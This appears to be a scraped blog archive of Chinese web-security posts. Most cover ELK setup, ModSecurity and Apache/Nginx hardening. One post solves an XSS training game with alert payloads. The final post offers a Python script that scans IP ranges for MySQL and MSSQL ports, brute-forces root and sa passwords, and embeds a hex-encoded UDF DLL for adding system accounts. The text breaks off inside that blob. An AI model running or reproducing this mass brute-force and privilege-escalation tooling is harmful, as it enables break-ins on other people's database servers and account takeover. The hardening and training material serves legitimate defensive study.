server.host: “192.168.253.139” #站点地址 elasticsearch.url: http://192.168.253.139:9200 #指向elasticsearch服务的ip地址 kibana.index: “.kibana” 启动 执行以下命令启动： /usr/share/kibana/bin/kibana 测试浏览器访问 访问：http://192.168.253.139:5602 正常启动后，需要配置索引，设置logstash-* ，添加索引和Available fields后，点击Discover就可以看到logstash传输过来的日志信息。 然后可以手动添加fields参数或者创建图表。 yum 安装以上安装方式为下载配置安装，可以使用yum安装。 # 导入私钥 rpm --import https://artifacts.elastic.co/GPG-KEY-elasticsearch # 添加yum源 vim /etc/yum.repos.d/es.repo yum源内容： [elasticsearch-6.x] name=Elasticsearch repository for 6.x packages baseurl=https://artifacts.elastic.co/packages/6.x/yum gpgcheck=1 gpgkey=https://artifacts.elastic.co/GPG-KEY-elasticsearch enabled=1 autorefresh=1 type=rpm-md 执行安装： # 安装java + ELK yum install java-1.8.0-openjdk.x86_64 elasticsearch.noarch kibana.x86_64 logstash.noarch -y # 修改配置文件 vi /etc/logstash/logstash.yml vi /etc/elasticsearch/elasticsearch.yml vi /etc/kibana/kibana.yml # 启动服务 systemctl start logstash.service elasticsearch.service kibana.service 配置文件和上文相同修改，如若无法访问，关闭防火墙 。 参考链接： https://blog.csdn.net/KingBoyWorld/article/details/78555120 https://www.cnblogs.com/yuhuLin/p/7018858.html https://www.elastic.co/products","categories":[],"tags":[{"name":"web安全","slug":"web安全","permalink":"/tags/web安全/"}]},{"title":"Apache中ModSecurity安装配置","slug":"Apache中ModSecurity安装配置","date":"2018-10-22T07:54:13.000Z","updated":"2018-10-22T10:28:19.050Z","comments":true,"path":"2018/10/Apache中ModSecurity安装配置/","link":"","permalink":"/2018/10/Apache中ModSecurity安装配置/","excerpt":"","text":"环境为centos 6.5 apache2.2 modsecurity2.9.2 安装mod_security的依赖 yum install gcc make httpd-devel libxml2 pcre-devel libxml2-devel curl-devel git 下载最新稳定的mod_security源代码 wget https://www.modsecurity.org/tarball/2.9.2/modsecurity-2.9.2.tar.gz 安装步骤： tar xzf modsecurity-2.9.2.tar.gz cd modsecurity-2.9.2 ./configure make install cp modsecurity.conf-recommended /etc/httpd/conf.d/modsecurity.conf cp unicode.mapping /etc/httpd/conf.d/ 安装完成后调整配置，修改httpd.conf LoadModule security2_module modules/mod_security2.so 如下配置，需要根据目录位置修改，因为modsecurity安装在/etc/httpd目录，配置文件在conf文件，所以不在写入以下配置。 &lt;IfModule security2_module&gt; Include conf.d/modsecurity.conf &lt;/IfModule&gt; 配置完成后下载owasp的规则： cd /etc/httpd git clone https://github.com/SpiderLabs/owasp-modsecurity-crs.git 或 wget https://github.com/SpiderLabs/owasp-modsecurity-crs/archive/v3.1.0-rc1.tar.gz mv owasp-modsecurity-crs modsecurity-crs cd modsecurity-crs cp crs-setup.conf.example modsecurity-crs-config.conf 在httpd.conf中修改 Include modsecurity-crs/modsecurity-crs-config.conf Include modsecurity-crs/rules/*.conf 修改完成后重启服务： service httpd restart 完成以后尝试SQL注入攻击，可以看到被拦截的页面。 在apache日志中查看error信息： 从上图可以看到拦截的类型和规则id，还有规则的目录文件。去对应的规则处查看规则文件，可以看到如下的规则匹配。 关于modsecurity的配置，根据各自设置的地址，比如当前地址为/etc/httpd/conf.d中。 SecRuleEngine On 设置为mod是否开启，默认设置为Detection Only，作用是只检测。Off则是关闭mod。 SecRequestBodyAccess On 检查请求体，默认开启，可以选择On或Off。 SecAuditEngine RelevantOnlySecAuditLogRelevantStatus “^(?:5|4(?!04))” SecAuditLogParts ABIJDEFHZ SecAuditLogType SerialSecAuditLog /var/log/modsec_audit.log 记录日志审计内容，文件地址等，如下图所示，ABCE等，修改SecAuditLogParts参数，可以记录不同的日志部分。对调试waf，修改配置策略很有用。 然后，如果需要修改其他配置项，比如403错误页面，直接再httpd.conf中修改403错误页面即可。 参考链接： http://www.vue5.com/centos/23142.html https://www.cnblogs.com/xiachj/p/4112194.html","categories":[],"tags":[{"name":"web安全","slug":"web安全","permalink":"/tags/web安全/"}]},{"title":"Apache和Nginx安全配置","slug":"Apache和Nginx安全配置","date":"2018-10-09T08:21:20.000Z","updated":"2018-10-09T14:38:34.712Z","comments":true,"path":"2018/10/Apache和Nginx安全配置/","link":"","permalink":"/2018/10/Apache和Nginx安全配置/","excerpt":"","text":"apache安全配置apache运行原理Apache是基于模块化设计的，它的核心代码并不多，大多数的功能都被分散到各个模块中，各个模块在系统启动的时候按需载入。从配置文件中可以看到加载的各个模块。 apache在启动阶段采用root权限来获取更多的资源使用权限，这个时候会加载配置文件，模块，资源文件等，在下一个运行阶段，Apache为了获得系统资源最大的使用权限，将以特权用户root完成启动。分11个阶段处理用户的请求。 apache的两种工作模式Apache通过MPM(多路处理模块)来使用操作系统的资源，对进程和线程池进行管理。Apache为了能够获得更好的运行性能，针对不同的平台 (Unix/Linux、Window)提供了不同的MPM，用户可以根据实际情况进行选择，其中最常使用的MPM有 prefork和worker两种。 prefork 一个单独的控制进程(父进程)负责产生子进程，这些子进程用于监听请求并作出应答。Apache总是试图保持一些备用的 (spare)或是空闲的子进程用于迎接即将到来的请求。这样客户端就无需在得到服务前等候子进程的产生。在Unix系统中，父进程通常以root身份运行以便邦定80端口，而 Apache产生的子进程通常以一个低特权的用户运行。User和Group指令用于配置子进程的低特权用户。 worker 每个进程能够拥有的线程数量是固定的。服务器会根据负载情况增加或减少进程数量。一个单独的控制进程(父进程)负责子进程的建立。每个子进程能够建立 ThreadsPerChild数量的服务线程和一个监听线程，该监听线程监听接入请求并将其传递给服务线程处理和应答。Apache总是试图维持一个备 用(spare)或是空闲的服务线程池。这样，客户端无须等待新线程或新进程的建立即可得到处理。在Unix中，为了能够绑定80端口，父进程一般都是以 root身份启动，随后，Apache以较低权限的用户建立子进程和线程。User和Group指令用于配置Apache子进程的权限。 apache 在centos下配置apache配置文件，默认文件在/etc/httpd/conf/httpd.conf路径下 那么简单理解一下，配置参数的含义和使用，Allow和Deny可以用于apache的conf文件或者.htaccess文件中（配合Directory, Location, Files等），用来控制目录和文件的访问授权。所以，最常用的是：Order Deny,AllowAllow from All 注意“Deny,Allow”中间只有一个逗号，也只能有一个逗号，有空格都会出错；单词的大小写不限。上面设定的含义是先设定“先检查禁止设定，没有禁止的全部允许”，而第二句没有Deny，也就是没有禁止访问的设定，直接就是允许所有访问了。 但是如果想限制IP访问，如下写 Order Deny,Allow Deny from 192.168.1.1 Allow from all 这时候限制不起作用，Order取规则为最后一个Allow规则，首先限制IP访问，但是会继续查看Allow规定指定的信息，IP又在all中，所以限制不起作用。所以可以如下写： Order Deny,Allow Deny from 192.168.1.1 或者 Order Allow,Deny Allow from all Deny from 192.168.1.1 比如：如下的常用配置 1、在配置文件开始部分和下部有两个配置项，用来隐藏banner信息： ServerTokens OS 修改为：ServerTokens Prod （在出现错误页的时候不显示服务器操作系统的名称）ServerSignature On 修改为：ServerSignature Off （不回显apache版本信息） 2、apache在一些系统的默认配置中，开启目录浏览，所以可以使用以下关闭设置。 将Options Indexes FollowSymLinks 改为 Options -Indexes FollowSymLinks 3、取消部分目录的php执行权限 &lt;Directory &quot;/var/www/html/upload&quot;&gt; &lt;FilesMatch &quot;\\.(?i:php|php3|php5)$&quot;&gt; Deny from all &lt;/FilesMatch&gt; &lt;/Directory&gt; //在upload目录下，尽可能多匹配后缀php|php3|php5的文件，不分大小写。 还可以在主机配置文件中增加php_flag engine off指令即可，配置如下： Options FollowSymLinks AllowOverride None Order allow,deny Allow from all php_flag engine off 5、配置httpd.conf限制一些特殊目录的特定ip访问，如内部接口等。 &lt;Directory &quot;/var/www/html/aaa&quot;&gt; Order Deny,Allow Deny from all Allow from 192.168.1.111 &lt;/Directory&gt; 6、配置httpd.conf限制一些文件类型的访问，如txt的日志 &lt;Files ~ &quot;.txt$&quot;&gt; Order allow,deny Deny from all &lt;/Files&gt; 7、针对URL相对路径的禁止访问： &lt;Location /dir/&gt; Order allow,deny Deny from all &lt;/Location&gt; Nginx 安全配置nginx 工作原理Nginx由内核和模块组成，nginx核心模块包括：HTTP模块、EVENT模块和MAIL模块。nginx仅仅通过查找配置文件将客户端请求映射到一个location block（location是Nginx配置中的一个指令，用于URL匹配），而在这个location中所配置的每个指令将会启动不同的模块去完成相应的工作。nginx架构类似于Apache的Worker工作状态，Nginx的每一个Worker进程都管理着大量的线程，真正处理请求的是Worker之下的线程。 nginx本身不能处理PHP，它只是个web服务器，当接收到请求后，如果是php请求，则发给php解释器处理，并把结果返回给客户端。nginx一般是把请求发fastcgi管理进程处理，fastcgi管理进程选择cgi子进程处理结果并返回被nginx。 nginx涉及到两个账户，一个是nginx的运行账户，一个是php-fpm的运行账户。如果访问的是一个静态文件，则只需要nginx的运行账户对文件具有读取权限；而如果访问的是一个php文件，则首先需要nginx的运行账户对文件有读取权限，读取到文件后发现是一个php文件，则转发给php-fpm，此时则需要php-fpm账户对文件具有读取权限。 nginx 在centos下的安全配置 nginx设置问题 #隐藏 Nginx 的版本号，提高安全性。 server_tokens off; #开启高效文件传输模式，sendfile 指令指定 Nginx 是否调用sendfile 函数来输出文件，对于普通应用设为 on，如果用来进行下载等应用磁盘 IO 重负载应用，可设置为 off，以平衡磁盘与网络 I/O 处理速度，降低系统的负载。 sendfile on; #是否开启目录列表访问，默认关闭。 autoindex off; 开头的配置 user www-data; //用户和组 worker_processes auto; //进程数 pid /run/nginx.pid; //进程文件 include /etc/nginx/modules-enabled/*.conf; //导入其他配置文件到nginx配置文件 events配置 events { worker_connections 768; //设置一个worker进程同时打开的最大连接数 # multi_accept on; //告诉nginx收到一个新连接通知后接受尽可能多的连接 } http配置 http { ## # Basic Settings ## sendfile on; //开启高效文件传输模式 tcp_nopush on; //告诉 Nginx 在一个数据包里发送所有头文件 tcp_nodelay on; //告诉 Nginx 不要缓存数据，而是一段一段的发送 keepalive_timeout 65; //连接超时时间，单位是秒 types_hash_max_size 2048; //上传文件大小限制 # server_tokens off; //隐藏 Nginx 的版本号 # server_names_hash_bucket_size 64; # server_name_in_redirect off; include /etc/nginx/mime.types; //包含配置 default_type application/octet-stream; //默认传输类型 ## # SSL Settings ## ssl_protocols TLSv1 TLSv1.1 TLSv1.2; # Dropping SSLv3, ref: POODLE ssl_prefer_server_ciphers on; ## # Logging Settings ## access_log /var/log/nginx/access.log; //访问日志 error_log /var/log/nginx/error.log; //错误日志 ## # Gzip Settings ## gzip on; # gzip_vary on; # gzip_proxied any; # gzip_comp_level 6; # gzip_buffers 16 8k; # gzip_http_version 1.1; # gzip_types text/plain text/css application/json application/javascript text/xml application/xml application/xml+rss text/javascript; ## # Virtual Host Configs ## include /etc/nginx/conf.d/*.conf; include /etc/nginx/sites-enabled/*; } server配置 众所周知，Nginx的配置文件分为Server、Location、If等一些配置块，并且存在包含关系，和编程语言比较类似。如果在外层配置的一些选项，是可以被继承到内层的。 但这里的继承也有一些特性，比如add_header，子块中配置后将会覆盖父块中的add_header添加的所有HTTP头，造成一些安全隐患。 server配置在一些系统上不是默认的nginx配置，如果需要修改可以在nginx配置中添加，或者添加include，包含进其他的自定义server。 如下列代码，Server块添加了CSP头： server { ... add_header Content-Security-Policy &quot;default-src &#39;self&#39;&quot;; add_header X-Frame-Options DENY; location = /test { add_header X-Content-Type-Options nosniff; rewrite ^(.*)$ /xss.html break; } } 但/test的location中又添加了X-Content-Type-Options头，导致父块中的add_header全部失效。 禁止一个目录的访问示例：禁止访问path目录 location ^~ /path { deny all; } 可以把path换成实际需要的目录，目录path后是否带有”/“，带“/”会禁止访问该目录和该目录下所有文件。不带”/“的情况就有些复杂了，只要目录开头匹配上那个关键字就会禁止；注意要放在fastcgi配置之前。 这个常见于Nginx做反向代理的情况，动态的部分被proxy_pass传递给后端端口，而静态文件需要Nginx来处理。 假设静态文件存储在/home/目录下，而该目录在url中名字为files，那么就需要用alias设置目录的别名： location /files { alias /home/; } 此时，访问http://example.com/files/readme.txt，就可以获取/home/readme.txt文件。 但我们注意到，url上/files没有加后缀/，而alias设置的/home/是有后缀/的，这个/就导致我们可以从/home/目录穿越到他的上层目录。从而导致一个目录穿越问题。 禁止php文件的访问及执行 示例：去掉单个目录的PHP执行权限 location ~ /attachments/.*\\.(php|php5)?$ { deny all; } 示例：去掉多个目录的PHP执行权限 location ~ /(attachments|upload)/.*\\.(php|php5)?$ { deny all; } 禁止IP的访问 示例：禁止IP段的写法： deny 10.0.0.0/24; 示例：只允许某个IP或某个IP段用户访问，其它的用户全都禁止 allow x.x.x.x; allow 10.0.0.0/24; deny all; 禁用非必要的方法 if ($request_method !~ ^(GET|HEAD|POST)$ ) { return 444; } 禁用扩展名 location ~* .(txt|doc|sql|gz|svn|git)$ { deny all; } 根据用户的真实 IP 做连接限制 ## 这里取得原始用户的IP地址 map $http_x_forwarded_for $clientRealIp { &quot;&quot; $remote_addr; ~^(?P&lt;firstAddr&gt;[0-9\\.]+),?.*$ $firstAddr; } ## 针对原始用户 IP 地址做限制 limit_conn_zone $clientRealIp zone=TotalConnLimitZone:20m ; limit_conn TotalConnLimitZone 50; limit_conn_log_level notice; ## 针对原始用户 IP 地址做限制 limit_req_zone $clientRealIp zone=ConnLimitZone:20m rate=10r/s; #limit_req zone=ConnLimitZone burst=10 nodelay; limit_req_log_level notice; 参考资料： https://www.cnblogs.com/chenpingzhao/p/5785416.html https://wooyun.kieran.top/#!/drops/201.Nginx%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE%E7%A0%94%E7%A9%B6 https://wooyun.kieran.top/#!/drops/315.Apache%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE https://blog.csdn.net/yf3585595511/article/details/54933646","categories":[],"tags":[{"name":"web安全","slug":"web安全","permalink":"/tags/web安全/"}]},{"title":"XSS GAME记录","slug":"XSS-GAME记录","date":"2018-10-05T12:05:20.000Z","updated":"2019-03-12T02:43:55.753Z","comments":true,"path":"2018/10/XSS-GAME记录/","link":"","permalink":"/2018/10/XSS-GAME记录/","excerpt":"","text":"在安全文摘上看到一篇前端安全的文章，最后提到了几个xss在线游戏，有两个是之前就见过的，一个没玩过，好像也是之前的xss游戏。 文章地址：https://segmentfault.com/a/1190000016551188 首先看第一关，此网站需要科学上网。 https://xss-game.appspot.com/level1 页面可以看到所用的html代码和js，以及后端的py代码，简单尝试一下，可以发现是写入页面。 并且从code中可以看到，没有过滤，直接 &lt;script&gt;alert(2)&lt;/script&gt; 第二关，留言框，post提交数据，直接插入图片。 &lt;img src=@ onerror=alert(2)&gt; 第三关，从链接猜测是锚点xss，尝试修改锚点，发现写入页面。 但是尝试后发现，并不是直接写入如上图所示页面那么简单，而是写入了img标签 查看其中的js代码，然后使用如下payload即可。 &#39; onerror=alert(2) &#39; 第四关，点击页面按钮后显示如下，猜测是在timer的xss，查看页面代码。 在timer.html页面下可以发现如下代码，基本可以断定是写入img标签的xss，直接使用onload事件，使用连字符直接alert()。 &#39;-alert(2)-&#39; 第五关，访问后是一个登陆后的页面，这里我们先退出页面。 sign up后可以看到，有输入email的地方，和next两个参数输入点，一开始以为是输入框的问题，尝试多次发现没有写入页面。 然后再signup.html页面下发现如下内容 初步判断是next参数的问题，也就是next写入img标签，尝试如下，必须点击next，一开始点击GO，一直没触发。 javascript:alert(2)","categories":[],"tags":[{"name":"web安全","slug":"web安全","permalink":"/tags/web安全/"}]},{"title":"批量获取数据库权限","slug":"批量获取数据库权限","date":"2018-09-28T02:05:11.000Z","updated":"2018-09-28T10:55:57.503Z","comments":true,"path":"2018/09/批量获取数据库权限/","link":"","permalink":"/2018/09/批量获取数据库权限/","excerpt":"","text":"眼看要到十一国庆小长假了，打算长假前写篇文章，巧合看到一篇老博文，dub ZJ居然要价七千，所以干脆写一个数据库ZJ脚本。 利用以下几点： 获取3306端口是否开放，开放后猜测root密码，密码猜测成功后，执行写入udf.dll，利用udf添加账号密码 。 获取1433端口是否开放，开放后猜测sa密码，密码猜测成功后，执行xp_cmdshell，2005以上就默认关闭了，获取sa权限之后重新开启，但还是需要在2008之前，利用xp_cmdshell写入远程账号密码。不过当用户已AUTHORITY\\NetworkService登陆时时（mssql2005express版默认）无法执行net user命令添加用户。只考虑了开启或者关闭xp_cmdshell的情况，删除的话暂不处理。 以上只针对Windows系统，数据库版本不高。 之所以采用这两种形式，一旦可以写入的话，即便没开启远程桌面，也可以利用udf或者xp_cmdshell开启远程桌面。 本地需要ip.txt 写入测试的IP网段，成功的会写入本地mysql，或者mssql 的txt文件。 如此，直接上代码，本地测试mysql没发现问题，如有考虑不周的或者认识错误的请告知。 `#coding:utf-8 import MySQLdb import pymssql import IPy import threading import Queue import socket import binascii class thread(threading.Thread): def init(self,queue): threading.Thread.init(self) self._queue = queue def run(self): while not self._queue.empty(): queue = self._queue.get(timeout=0.5) try: sock = socket.socket() sock.settimeout(2) try: sock.connect((queue, 3306)) print u&quot;检测到&quot; + queue + u&quot;:3306端口开放，测试中。。。&quot; self.mysql(queue) except: print queue + u&#39;:3306 端口关闭&#39; try: sock.connect((queue, 1433)) print u&quot;检测到&quot; + queue + u&quot;:1433端口开放，测试中。。。&quot; self.mssql(queue) except: print queue + u&#39;:1433 端口关闭&#39; except: continue def mysql(self,queue): with open(&#39;mm.txt&#39;,&#39;r&#39;) as f: file = f.readlines() for mm in file: try: db = MySQLdb.connect(queue, &quot;root&quot;, mm.strip(&#39;\\n&#39;), &quot;mysql&quot;, connect_timeout=2) print u&quot;爆破%s:3306端口成功，账号密码为: root/%s&quot; %(queue, mm.strip(&#39;\\n&#39;)) cursor = db.cursor() cursor.execute(&quot;SELECT VERSION()&quot;) data = cursor.fetchone() udf = binascii.a2b_hex(&quot;4D5A90000300000004000000FFFF0000B800000000000000400000000000000000000000000000000000000000000000000000000000000000000000F80000000E1FBA0E00B409CD21B8014CCD21546869732070726F6772616D2063616E6E6F742062652072756E20696E20444F53206D6F64652E0D0D0A24000000000000004D477BD0092615830926158309261583005E86830B261583005E808308261583005E968307261583005E91830B2615832EE06E830A2615830926148325261583005E9C8308261583005E878308261583005E8483082615835269636809261583000000000000000000000000000000000000000000000000504500004C0103004AFE9F5A0000000000000000E00002210B010900001000000010000000600000607C0000007000000080000000000010001000000002000005000000000000000500000000000000009000000010000000000000020000000000100000100000000010000010000000000000100000007C83000008020000B4820000C800000000800000B402000000000000000000000000000000000000848500001000000000000000000000000000000000000000000000000000000000000000000000002C7E00004800000000000000000000000000000000000000000000000000000000000000000000000000000000000000555058300000000000600000001000000000000000040000000000000000000000000000800000E0555058310000000000100000007000000010000000040000000000000000000000000000400000E02E7273726300000000100000008000000006000000140000000000000000000000000000400000C00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000332E393100555058210D090208B92BCF11B11CEEA24F550000560C000000220000260000A8FFFFFFFF8B4C240833C03901741656578B7C24146A0C59BE000010DCF3A566A55FB0015E5DFB77FBC38B44240C1A6A071611108BF8183218FF63DB6F1CA45FC7011E1200210883380175128B40040DF6776F0700750A1004C6000132C0C3530ABF1DF68D3C3053A454082D08FF30FF15FFF6EE776C885985C075085614C601011BC8568D71018A11FD6FDFFE4184D275F98B54142BCE890A32558BEC8B4D0C833902B7D860BF5374148B7D10915C5453EB4CBF9DBDDF8B417D740F1B707C1BEBE5836004DBB1FFB7001A0C8B48048B008D4401025072A0594C08DFC8D7B5891678113006A44CEB6C57BEB7B2B85F5E5DA30421740833DBB63FF6A8591353568B742410D878534602DB85DB5BB6460851C78D5C4257E8240B75EEEEBFE01400C604070008FF70041E0553B1DB1B921A22C418535720030054090F09B7086A995B0F98599954CF2D343713B8F4540B1EDEB60D818403552251519D35DFFED6FEDF576800F762D66A018945FC068BF08B4560DD7FF70CC606004533FF595939387471683CC071C6FEDFDA9C12260C3BC7745B506A04FF75FC149073E1EDD7A9FD48533AFC8D48911040B963DBFF2BC18BD88D043B505630F8268C5330D8AD8DBD5F03FE570E940DE57DF8463FE6364C2066BA5B1810A4803E0059169EB0FF741A8BC6C64437FF00594D1489C906987BEBD86F183E5F205EC9C3EED7B235DCBAF37D574708C45030087BDBDACDC9C26A4078C710548D4601B9E07E614251724F0856FF31CF6BAFDD9DB694C66AFF8DC32082F63A58B0B6030D092C23005F7CC36E57036C6A081D1290AC0AA88365FC2F6C2F2C2D4592D0EB071B408F65E8C70BBFD66E42FEFF000D1FEDC25E3BFFDB17B60D08209A02F3C3E90806F58BFF56688000002D8C6D675880985608845AA3BDE0FEBB062358045485F675054DAA83260076FBB7DB4508C36F08ED09ACC704240607FF0B4C113637598D71FFCF9C0BBF77DFC9750E39056B107E3CFF7310830B01FBEEC6BB8B0910548B098F57890A23480F85D47D618CBBAD641718068B79040838071B76EDEEBB1E50EB184AA705B8E61768B0B030D8E803A83C0957C1D6BBAEB5D6A1E7E9E2573CA12F4C6A6FF777C3025EFD096A1FEE76EB3CAA10C80475ED7BEFC0C7051F281A70E027071BDFF79D5CB520BC04B81B6A5635B952EB782B7339B2E3696FF7DEFD7340393D155C741C68062809AC43DB6B85850D9E1034252316FFE666F862F154B201DC0801592CC2B1A1DB78049DDFDBF62413D90FD4FC83F80266B16F6CB0D2595BFFA0584B77783BB5783106350F8487C71996EE4CD3543BF81810897D82EFC796BE35FAC87251833F8AF36A7C398587B4F10774E9FFC8D60F7C89C5DB9BB5D955F85615441B474DED5BE38EF88A394D1003D00874B48909437AA36D020C1AD3F8EBA71C3162CC5A64442E386161FB0A58064C32FC19503F1BDF720443375BC9C20CC710FB02231FB2288B2EF28B5D081CAE0FDB9B54E433C95CFC7D2008016C2DC6C23BF15A393A4417E4D61BFE7FAFAE3BF0740583FE02752E1910D03BC1E7166EB8ED57565FD03B5EE40003937B703B67115A039614168012376C7D270A8227FEA0246420575062B30D661327002F527F8DF61AD2061153F76A037543B067BB614F34032168742E2C0D2C3CEC257FEB1B71EC5A09706A7C6FAAE05051597C64825D900EADF62FFA8A19066B8F91B6C72AE490C396EC1640E134A9FF3B246ABB41C1F17926547DBC550C0D381E33BC05BC595D382281EC2832F7869F365F212043211C895E2118891D05F78EC243143C21A2AA210C668C186C5FFBDA3806252C0620080605DD2DCDD20425002D7FFC9C8F7AB6B1F6143095562407042831D6FEDB7F0807348B85E0FCA0AA701DDBB5B395011C1920241318092B18476A565F201CB360C32C9F7B8985D8320A04DC03B557E01B243468DEDFD1F7D8D360CE2879D40A2C833D208DBDC3DA00F923685B1B300BDFAF67F534C97F23401EC25F6A4849918F144A50152E9DF458AAF8A29C10F3EB67611C7E052C37D4598FEDED8321B9273551E0F5EE3BDC0ABF03E4507F4B8417185BDB7E600BCE1CDC142CD6E288B154B609E01B14F413160A4BDB313DDCDBFFDC84676CC859D94E1E07F7D81BF076BBB7C00359485D1656B8BC18BE04A3638B6F2AF83BC673080753025073D85F60835A3BFE72F15F5E25206C6053C820CC006F35B4DD452BB84D5A346627040B85BF2B5E6E413C03C1813850E45FEFA5ECFFFB33D2B90B011C48180F94C28BC25DC33FB702BF35E34831C80FB74114AE057106C1A55B6C33578C081817761BFFFF2FF1D7487BF972098B580803D93BFB720A4283C0283BD67270CA36B5E86AE55DC38F6AFEF0CD71F7A970040B056418005083EC080DB7C670082F316C33C576F0852F06DF64A31A89B90968555DB7F081F0B2091C6B04F555972DD12C937D1350195C083B04E1C26F2724C1E81FF715E0018FEFB6532B034F230059948BE55DC3621DDB49A301CA3DAFC0FAE99525242631CCFF29343232B61058054C50AC2CB41E97AF12B60D56096B27D7616B20CFB0FBEF2AE4E03160031F73D9665B9A6C038D2BE0FAFC046BA039F13CB4FC8A0D6C120C7D0DC395C3C1619C965154147FE41F3E783124F020140BDAC40E5643B25D53EC1068F885626DF4F888C9BF4EE640BB25EEA0398466820D85C33149DB9F0A359A04EB605675F869639FC1F6448B7598751F1033F0071476E6CA20189D271CB4F6EE6FEDF4330C113BF77507BE4F59EB0B85F30A7B047EA10AC1E0100BF0CE00F7D6076C840D1E045E5F01C33F5C05646464646064686C1405766474B000003FF4C20E034B0F20185F4E6F20FFFFB7FF617267756D656E7473096C6C6F77656420287564663A206C69625F6DCCFD6DF77973716C0D5F73085F696E666F293918DFB6FF8F2076657273696F6E20302E01341F45787065F6DBDBDD637447657861076C79201A65207374723F5BDB5AFB672074791B75726171217258C00E602B7477911FD86F030B3F8672206E616D48DBB1B71F436F756C246E6F74C4636113203058B76D186D2779AF72F1483FDA4D943F2003121071051BF29D5860214707D0604D0D0B0F81CB074ED961DD9703AB17CC2708A77527ECC00FD81F0A3B034FC0A07B851F03240328C1556583A200C5889251CA22D877BDB119BF44FF000F5565A3AA00A8AA9251645455C95532AAAAFFF61D455C0410020157616974466F00FC06C07253886C654F626A07C07F6B99145669727475616C417603E0F6370D536574456E76126F6EC000BC6DBF5661726961622B4118437265F76DEB6E94546806640D47264375727222CD12F65B502A636573734914266E03E083135469636BDE6E6BB1F6B6FD5175657279500366846D616E371667EF1B00FD0144697367374CFDB7EDED6962727879436192731A4973446562756767EDEE6DAD266A686546A4556E6840B1B7B7B7643164457846707469AF46696C4A6D295B6119B41254DE64AEB0176D0DD8114990B9EDD61A0A6B409D6D70876547C25A73CD517F77555122B4ED6E591B5C537973186DEEC3C2EB2E39417373650975697CDB15DA434C7D5F687E396D5F2EDFFEDEBE5F616D7367087869740B646A753A5F666469EC4217B076260A639A5F64FD6CADB91F5F686F6F6B131459725FF802700148D15FDB9CEB0249730A330A6C21D6F0BD82539C2A64D46E640893050B130F651E6B5B7BC25F2C723456ED6D1C182FF6D69A700A035F706F522947E1DDBE6E106468756C5EB92A6BCB92BD9B1B2CA806E0B6D86E6EC57265250866112E827BDB5673749C637079082439EDCD5C6B32C06E4D0FD7ED1F5AC36F7319663A1F5F4370705831C75E3B8474BC6D343F001817FFFFFFFF3D193C1C1B161E55142D16270815270F11115F10130A070D2E17090705160C1E7FFBFFFF080A0B160918181505061B050C10060717062105110F061421110B08E4FBDFB62B22052A111D0D18532D483806000776FBDBE5080C09330A090B0C051007061612EEDFFEED0E0B34150B18160D3D0542C205121E14066930FFD8DDFF110C0E1D4D0517230D0C3224080B4506F0DE041004F03B0A6EFF2C01043808041C1C0204003E4C016DFF21FD05004AFE9F5A8FE00002210B0109080C634F7AD60C1213D616A300200E10C10A01630B02AB3362B7EE6107006003040233351EEED9C0CE34100706C02633D6EDDB7620AC22033C144002B0021C5759DD0050520143C8C8BA65B1214200A7B82F06DB5D182EB4787407EA0B900C5BFA90CDB742602E72647D610861C90E76C508FB0A00C700A1DB66BB77402E26300304301BECDB943D001A27C04F73726300EB11C0061B40731C4F78C2C2A365761F01030002ED7760497B27421BA023030000EDD8D152127C53030400000000000080FF00000000000000000000807C2408010F85B901000060BE007000108DBE00A0FFFF5783CDFFEB0D9090908A064688074701DB75078B1E83EEFC11DB72EDB80100000001DB75078B1E83EEFC11DB11C001DB73EF75098B1E83EEFC11DB73E431C983E803720DC1E0088A064683F0FF747489C501DB75078B1E83EEFC11DB11C901DB75078B1E83EEFC11DB11C975204101DB75078B1E83EEFC11DB11C901DB73EF75098B1E83EEFC11DB73E483C10281FD00F3FFFF83D1018D142F83FDFC760F8A02428807474975F7E963FFFFFF908B0283C204890783C70483E90477F101CFE94CFFFFFF5E89F7B92A0000008A07472CE83C0177F7803F0075F28B078A5F0466C1E808C1C01086C429F880EBE801F0890783C70588D8E2D98DBE005000008B0709C0743C8B5F048D8430B472000001F35083C708FF96F0720000958A074708C074DC89F95748F2AE55FF96F472000009C07407890383C304EBE16131C0C20C0083C7048D5EFC31C08A074709C074223CEF771101C38B0386C4C1C01086C401F08903EBE2240FC1E010668B0783C702EBE28BAEF87200008DBE00F0FFFFBB0010000050546A045357FFD58D871702000080207F8060287F585054505357FFD558618D4424806A0039C475FA83EC80E9AD98FFFF0000004800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000030001010220010010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000040000000000010018000000180000800000000000000000040000000000010002000000300000800000000000000000040000000000010009040000480000005C80000056020000E404000000000000584000003C617373656D626C7920786D6C6E733D2275726E3A736368656D61732D6D6963726F736F66742D636F6D3A61736D2E763122206D616E696665737456657273696F6E3D22312E30223E0D0A20203C7472757374496E666F20786D6C6E733D2275726E3A736368656D61732D6D6963726F736F66742D636F6D3A61736D2E7633223E0D0A202020203C73656375726974793E0D0A2020202020203C72657175657374656450726976696C656765733E0D0A20202020202020203C726571756573746564457865637574696F6E4C6576656C206C6576656C3D226173496E766F6B6572222075694163636573733D2266616C7365223E3C2F726571756573746564457865637574696F6E4C6576656C3E0D0A2020202020203C2F72657175657374656450726976696C656765733E0D0A202020203C2F73656375726974793E0D0A20203C2F7472757374496E666F3E0D0A20203C646570656E64656E63793E0D0A202020203C646570656E64656E74417373656D626C793E0D0A2020202020203C617373656D626C794964656E7469747920747970653D2277696E333222206E616D653D224D6963726F736F66742E564339302E435254222076657273696F6E3D22392E302E32313032322E38222070726F636573736F7241726368697465637475